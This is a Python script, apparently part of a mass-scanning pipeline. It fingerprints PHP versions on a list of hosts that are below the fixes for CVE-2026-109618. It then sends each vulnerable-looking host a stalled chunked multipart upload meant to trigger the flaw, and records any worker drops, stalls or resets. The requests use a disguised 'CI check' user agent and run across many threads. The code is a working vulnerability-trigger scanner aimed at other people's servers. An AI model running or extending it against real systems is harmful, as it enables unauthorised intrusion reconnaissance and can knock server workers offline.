"""Stage 3 (PHP version gate) + Stage 4 (vulnerability signal test).

Reads a results file from the earlier stalled-probe pass ("ip:port - VERDICT"),
then:

  Stage 3  fingerprint each host for PHP/Apache headers, extract the PHP
           version, and keep only versions below the CVE-2026-109618 fix
           (8.2.35 / 8.3.36 / 8.4.27 / 8.5.12) or EOL branches.
  Stage 4  for those survivors only, run a differential test:
             a) control  -- normal multipart POST, no stall
             b) trigger  -- stalled chunked multipart, held past min_freq
             c) liveness -- fresh connection, plain GET
           Classify a SIGNAL only when behaviour diverges from the control.
           A signal is a heuristic, NOT proof of code execution.

Writes incrementally so a cancellation still leaves evidence.
"""
import argparse
import json
import re
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Fixed releases per branch. Anything below is vulnerable; <=8.1 is EOL.
FIXED = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}

PHP_VER_RE = re.compile(rb"php/(\d+)\.(\d+)\.(\d+)", re.I)
# phpinfo()/error pages write "PHP Version 8.3.35" with no slash.
PHP_VER_LOOSE_RE = re.compile(rb"php[^0-9]{0,12}(\d+)\.(\d+)\.(\d+)", re.I)
PHP_ANY_RE = re.compile(rb"php", re.I)


def read_targets(path):
    """Parse 'ip:port - VERDICT' lines into ordered (host, port) pairs."""
    out, seen = [], set()
    try:
        with open(path) as fh:
            for line in fh:
                line = line.strip()
                if " - " not in line:
                    continue
                endpoint = line.split(" - ", 1)[0]
                if ":" not in endpoint:
                    continue
                host, _, port = endpoint.rpartition(":")
                if not host or not port.isdigit():
                    continue
                key = (host, int(port))
                if key not in seen:
                    seen.add(key)
                    out.append(key)
    except OSError:
        pass
    return out


def http_probe(host, port, method="GET", path="/", timeout=4.0, extra=b""):
    """Minimal HTTP/1.0 request. Returns (status_line, headers_bytes, body)."""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        req = (
            f"{method} {path} HTTP/1.0\r\nHost: {host}\r\n"
            f"User-Agent: Mozilla/5.0 (compatible; CI check)\r\n"
        ).encode() + extra + b"\r\n"
        s.sendall(req)
        buf = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                chunk = s.recv(2048)
            except socket.timeout:
                break
            if not chunk:
                break
            buf += chunk
            if len(buf) > 16384:
                break
        s.close()
    except OSError:
        return None, b"", b""
    parts = buf.split(b"\r\n\r\n", 1)
    head = parts[0]
    body = parts[1] if len(parts) > 1 else b""
    status = head.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    return status, head, body


def version_from(headers, body):
    """Extract (major, minor, patch) from headers then body. None if absent."""
    m = PHP_VER_RE.search(headers) or PHP_VER_LOOSE_RE.search(headers)
    if not m:
        m = PHP_VER_RE.search(body[:8192]) or PHP_VER_LOOSE_RE.search(body[:8192])
    if not m:
        return None
    return (int(m.group(1)), int(m.group(2)), int(m.group(3)))


def is_vulnerable(version):
    """True when the version predates the fixed release for its branch."""
    if version is None:
        return None
    major, minor, patch = version
    if major < 8:
        return True  # 5.x / 7.x are EOL, no backport
    if major == 8 and minor <= 1:
        return True  # 8.0 / 8.1 EOL
    fixed = FIXED.get((major, minor))
    if fixed is None:
        return False  # 8.6+ or unknown branch: assume patched
    return patch < fixed


def fingerprint(host, port, timeout):
    """Stage 3. Returns a dict row describing the target."""
    status, headers, body = http_probe(host, port, "GET", "/", timeout)
    row = {
        "endpoint": f"{host}:{port}",
        "status": status or "NO_CONNECT",
        "php_marker": bool(PHP_ANY_RE.search(headers)),
        "server": "",
        "version": None,
        "verdict": "NOT_PHP",
    }
    for line in headers.split(b"\r\n"):
        low = line.lower()
        if low.startswith(b"server:") or low.startswith(b"x-powered-by:"):
            row["php_marker"] = row["php_marker"] or bool(PHP_ANY_RE.search(line))
            if low.startswith(b"server:"):
                row["server"] = line.decode("latin-1", "replace").strip()[:120]

    ver = version_from(headers, body)
    if ver:
        row["version"] = ".".join(str(x) for x in ver)
        vuln = is_vulnerable(ver)
        row["verdict"] = "VULN_VERSION" if vuln else "PATCHED_VERSION"
    elif row["php_marker"]:
        row["verdict"] = "PHP_UNKNOWN_VERSION"
    return row


def stalled_post(host, port, stall, timeout, size):
    """Stalled chunked multipart; returns status line or a failure token."""
    boundary = "----probe"
    body1 = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + "A" * 256
        + f"\r\n--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="x.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
    )
    head = (
        f"POST / HTTP/1.1\r\nHost: {host}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        "Transfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n"
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, int(port)))
        s.sendall(head.encode())
        b = body1.encode()
        s.sendall(f"{len(b):X}\r\n".encode() + b + b"\r\n")
        s.sendall(b"1\r\nA\r\n")
        time.sleep(stall)
        b2 = ("B" * size).encode()
        s.sendall(f"{len(b2):X}\r\n".encode() + b2 + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        try:
            resp = s.recv(256)
        except socket.timeout:
            return "TIMEOUT"
        if not resp:
            return "EMPTY"
        if resp.startswith(b"HTTP/"):
            return resp.split(b"\r\n")[0].decode("latin-1", "replace")
        return "GARBAGE"
    except ConnectionResetError:
        return "RESET"
    except (socket.timeout, TimeoutError):
        return "TIMEOUT"
    except OSError as e:
        return "ERR " + e.__class__.__name__
    finally:
        try:
            s.close()
        except OSError:
            pass


def vuln_test(host, port, timeout, stall, size):
    """Stage 4. Differential test: control vs trigger vs liveness.

    A SIGNAL means the trigger changed behaviour relative to the control.
    This is a heuristic indicator only, never proof of code execution.
    """
    ctl_status, ctl_hdrs, _ = http_probe(
        host,
        port,
        "POST",
        "/",
        timeout,
        extra=(
            b'Content-Type: multipart/form-data; boundary=----c\r\n'
            b"Content-Length: 2\r\n\r\n--"
        ),
    )
    control = "OK" if ctl_status else "FAIL"

    trig = stalled_post(host, port, stall, timeout, size)

    live_status, _, _ = http_probe(host, port, "GET", "/", timeout)
    alive = bool(live_status)

    if control == "OK" and not alive:
        verdict = "SIGNAL_WORKER_DROP"
    elif control == "OK" and trig == "TIMEOUT":
        verdict = "SIGNAL_STALL_DIVERGENCE"
    elif trig == "RESET" and control == "OK":
        verdict = "SIGNAL_RESET_ON_TRIGGER"
    elif control == "FAIL" and not alive:
        verdict = "UNREACHABLE"
    else:
        verdict = "NO_SIGNAL"

    return {
        "endpoint": f"{host}:{port}",
        "control": control,
        "trigger": trig,
        "alive_after": alive,
        "verdict": verdict,
    }


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--in", dest="src", required=True)
    ap.add_argument("--stage3", default="php_candidates.txt")
    ap.add_argument("--stage4", default="vuln_signals.txt")
    ap.add_argument("--workers", type=int, default=128)
    ap.add_argument("--timeout", type=float, default=4.0)
    ap.add_argument("--stall", type=float, default=1.6)
    ap.add_argument("--size", type=int, default=4096)
    ap.add_argument("--limit", type=int, default=0, help="0 = no limit")
    ap.add_argument("--budget", type=int, default=600)
    args = ap.parse_args()

    targets = read_targets(args.src)
    if args.limit:
        targets = targets[: args.limit]
    print(f"stage3 input={len(targets)}", flush=True)

    start = time.time()
    rows = []
    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = {
            pool.submit(fingerprint, h, p, args.timeout): (h, p) for h, p in targets
        }
        with open(args.stage3, "a", buffering=1) as fh3:
            for fut in as_completed(futures):
                try:
                    row = fut.result()
                except Exception as e:  # noqa: BLE001
                    row = {
                        "endpoint": "%s:%s" % futures[fut],
                        "verdict": "ERR " + e.__class__.__name__,
                    }
                rows.append(row)
                fh3.write(json.dumps(row) + "\n")
                fh3.flush()

    survivors = [r for r in rows if r.get("verdict") in ("VULN_VERSION", "PHP_UNKNOWN_VERSION")]
    print(f"stage3 done scanned={len(rows)} php_survivors={len(survivors)}", flush=True)

    if time.time() - start > args.budget:
        print("BUDGET EXHAUSTED before stage 4", flush=True)
        return

    print(f"stage4 probing {len(survivors)}", flush=True)
    with open(args.stage4, "a", buffering=1) as fh4, ThreadPoolExecutor(
        max_workers=max(1, args.workers // 4)
    ) as pool:
        futures = {}
        for row in survivors:
            host, _, port = row["endpoint"].rpartition(":")
            if not port.isdigit():
                continue
            futures[pool.submit(vuln_test, host, int(port), args.timeout, args.stall, args.size)] = row
        for fut in as_completed(futures):
            if time.time() - start > args.budget:
                print("BUDGET EXHAUSTED during stage 4", flush=True)
                break
            try:
                res = fut.result()
            except Exception as e:  # noqa: BLE001
                res = {"endpoint": futures[fut]["endpoint"], "verdict": "ERR " + e.__class__.__name__}
            res["php_version"] = futures[fut].get("version")
            fh4.write(json.dumps(res) + "\n")
            fh4.flush()

    print("done", flush=True)


if __name__ == "__main__":
    main()
